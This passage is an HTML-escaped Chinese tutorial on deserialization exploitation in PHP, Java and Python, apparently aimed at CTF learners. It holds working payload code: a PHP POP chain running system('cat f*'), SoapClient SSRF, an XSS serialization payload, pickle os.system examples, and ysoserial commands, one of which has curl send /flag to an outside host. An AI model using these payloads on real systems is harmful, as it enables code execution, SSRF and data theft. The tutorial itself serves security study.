&lt;p&gt;php 中有一些魔术方法，在实例化时后者其他操作时不经意间出发了类中的 方法，可以利用这个特点，将自己伪造的数据带入其中，让自己伪造的数据反 序列化后可以读取存储在类中魔术方法中的数据如果参数是一个类，需要重写 这个类，并且将所有的变量按照自己破解的规范进行书写，最后进行实例化与 url 加密序列化后的数据。&lt;/p&gt;
&lt;p&gt;（2）一个生成序列化值的例子：&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;实例化之后，会调用__construct方法，并且因为是实例是可以调用ctfShowUser中的私有变量的，&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;将此定义号的 class 变量设置为 new backDoor 意味着再次调用 backDoor 中的私有变量 code，并且执行相应的命令。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;最后将该操作流程返回的数据进行序列化和 url 编码后代入到原来的题目中即可执行此命令。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;class ctfShowUser&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;private $class;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  public function __construct()&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $this-&amp;gt; class = new backDoor();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;class backDoor&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  private $code=&amp;#x27;system(&amp;quot;cat f*&amp;quot;);&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;b= new ctfShowUser();&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo serialize($b);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;（3）序列化数据显示：&lt;/p&gt;
&lt;p&gt;private 属性序列化的时候格式是 %00 类名 %00 成员名&lt;/p&gt;
&lt;p&gt;protect 属性序列化的时候格式是 %00*%00 成员名&lt;/p&gt;
&lt;p&gt;序列化时 % 00 会被当成一个长度为一的字符串处理但是不会显示出来，一般是&lt;/p&gt;
&lt;p&gt;序列化时候需要通过编码才可以进行利用。如 test 类下的 private age:“29” 经过序列化之后的数据为 s:9:“testage”&lt;/p&gt;
&lt;h4 id=&#34;php-原生类&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#php-原生类&#34;&gt;#&lt;/a&gt; php 原生类&lt;/h4&gt;
&lt;p&gt;(4) 利用 php 原生类 SoapClient 类进行读文件:&lt;/p&gt;
&lt;p&gt;PHP 的内置类 SoapClient 是一个专门用来访问 web 服务的类，可以提供一 个基于 SOAP 协议访问 Web 服务的 PHP 客户端。&lt;/p&gt;
&lt;p&gt;该内置类有一个 __call 方法，当 __call 方法被触发后，它可以发送 HTTP 和 HTTPS 请求。正是这个 __call 方法，使得 SoapClient 类可以被我们运用在 SSRF 中。而__call 触发很简单，就是当对象访问不存在的方法的时候就会触发。&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;SoapClient&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;public SoapClient :: SoapClient(mixed $wsdl [，array $options ])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;第一个参数是用来指明是否是wsdl模式，将该值设为null则表示非wsdl模式。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;直接利用SoapClient来进行SSRF&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;a = new SoapClient(null, array (&lt;span class=&#34;string&#34;&gt;&amp;#x27;location&amp;#x27;&lt;/span&gt;=&amp;gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;http://ip:10000/aaa&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;uri&amp;#x27;&lt;/span&gt;=&amp;gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;http://ip:10000&amp;#x27;&lt;/span&gt;));&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;b = serialize(&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo $b;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;c = unserialize(&lt;span class=&#34;variable&#34;&gt;$b&lt;/span&gt;);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;c-&amp;gt;a(); // 随便调用对象中不存在的方法, 触发__call方法进行ssrf&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;（5）本地 Demo-xss：&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;输出对象可调用__toString，无代码通过原生类Exception&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;highlight_file(__file__);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;a = unserialize(&lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;k&amp;#x27;&lt;/span&gt;]);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo $a;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;Exception使用查询编写利用，通过访问触发输出产生XSS漏洞&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;a= new Exception(&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;script&amp;gt;alert(&amp;#x27;xiaodi&amp;#x27;)&amp;lt;/script&amp;gt;&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo urlencode(serialize($a));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;java反序列化&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#java反序列化&#34;&gt;#&lt;/a&gt; java 反序列化&lt;/h4&gt;
&lt;p&gt;（1）java 反序列化漏洞原理：&lt;/p&gt;
&lt;p&gt;序列化是把 Java 对象转换为字节序列的过程，反序列化是把字节序列恢复为 Java 对象的过程。对象的序列化主要有两种用途：一是把对象的字节序列永久地保存到硬盘上，通常存放在一个文件中即持久化对象，另外就是在网络上传送对象的字节序列即网络传输对象。&lt;/p&gt;
&lt;p&gt;（2）java 反序列化识别：&lt;/p&gt;
&lt;p&gt;原始数据 -&amp;gt; 序列化 writeobject-&amp;gt;base64 编码 -&amp;gt; 传输 -&amp;gt;base64 解码 -&amp;gt; 反序列化 readobject-&amp;gt; 最终数据。&lt;/p&gt;
&lt;p&gt;反序列化操作一般应用在导入模板文件、网络通信、数据传输、日志格式化存储、对象数据落磁盘、或 DB 存储等业务场景。因此审计过程中重点关注这些功能板块。&lt;/p&gt;
&lt;p&gt;一段数据以 rO0AB 开头，你基本可以确定这串就是 JAVA 序列化 base64 加密的数据。或者如果以 aced 开头，那么他就是这一段 java 序列化的 16 进制。&lt;/p&gt;
&lt;p&gt;（3）java 反序列化利用工具推荐：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2Zyb2hvZmYveXNvc2VyaWFs&#34;&gt;https://github.com/frohoff/ysoserial&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;ysoserial 中是针对组件来产生反序列化代码的，URLDNS 是不需要其他组件 支撑的，但是功能单一，还有依赖于组件产生的漏洞，这种依赖包构造出来的 反序列化代码会有更多的功能。大部分是需要组件支撑的，版本目前已经跟不 上现在的组件版本了。&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;没组件生成DNS利用的payload：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS &amp;quot;http://9ar7xl.dnslog.cn&amp;quot; &amp;gt; urldns.ser&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;借助rome:1.0组件生成payload:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;java -jar ysoserial-master-30099844c6-1.jar ROME &amp;quot;curl [http://x.x.x.x:4444/](http://x.x.x.x:4444/) -d@/flag&amp;quot; &amp;gt; flag.bin&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;根据是否选择组件来生成payload：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;生成payload的时候载入当前包（功能比较多）：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;java -Dhibernate5 -cp hibernate-core-5.4.9.Final.jar;ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.GeneratePayload Hibernate1 &amp;quot;calc.exe&amp;quot; &amp;gt; x.bin&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;直接利用ysoserial给的参数载入（功能比较少）：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;java -jar ysoserial-0.0.6-SNAPSHOT-all.jar Hibernate1 &amp;quot;calc.exe&amp;quot; &amp;gt; y.bin&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;（4）java 反序列化解密工具推荐 SerializationDumper&lt;/p&gt;
&lt;p&gt;下载地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL05pY2tzdGFEQi9TZXJpYWxpemF0aW9uRHVtcGVy&#34;&gt;https://github.com/NickstaDB/SerializationDumper&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;SerializationDumper 解密的是 ace 开头的数据即 16 进制数据，分析 java 的序列化之后的内容。如 java -jar SerializationDumper-v1.13.jar -r urldns.ser &amp;gt; dns.txt。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;java 安全在实战中很难遇到，因为其机制是非常复杂的&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;py反序列化&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#py反序列化&#34;&gt;#&lt;/a&gt; py 反序列化&lt;/h4&gt;
&lt;p&gt;（1）常见 py 反序列化函数：&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;将对象序列化后保存到文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pickle.dump(obj, file)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;读取文件， 将文件中的序列化内容反序列化为对象&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pickle.load(file)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;将对象序列化成字符串格式的字节流&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pickle.dumps(obj)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;将字符串格式的字节流反序列化为对象&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pickle.loads(bytes_obj)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;反序列化调用__reduce__() &lt;strong&gt;reduce_ex&lt;/strong&gt;() &lt;strong&gt;setstate&lt;/strong&gt; () , 序列化调用__getstate__&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;魔术方法 __reduce__() 的使用举例：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import pickle&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import os&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;class A(object):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  def __reduce__(self):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    print (&amp;#x27;反序列化调用&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    return (os.system,(&amp;#x27;calc&amp;#x27;,))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;a = A()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p_a = pickle.dumps(a)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pickle.loads(p_a)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print (&amp;#x27;==========&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print (p_a)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;魔术方法 __setstate__() 的使用举例：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;class SerializePerson():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  def __init__(self, name):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    self.name = name&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;  # &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;构造 __setstate__ 方法&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  def __setstate__(self, name):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    os.system(&amp;#x27;calc&amp;#x27;) # 恶意代码&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tmp = pickle.dumps(SerializePerson(&amp;#x27;tom&amp;#x27;)) # 序列化&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pickle.loads(tmp) # 反序列化 此时会弹出计算器&lt;/span&gt;&lt;br&gt;&lt;span 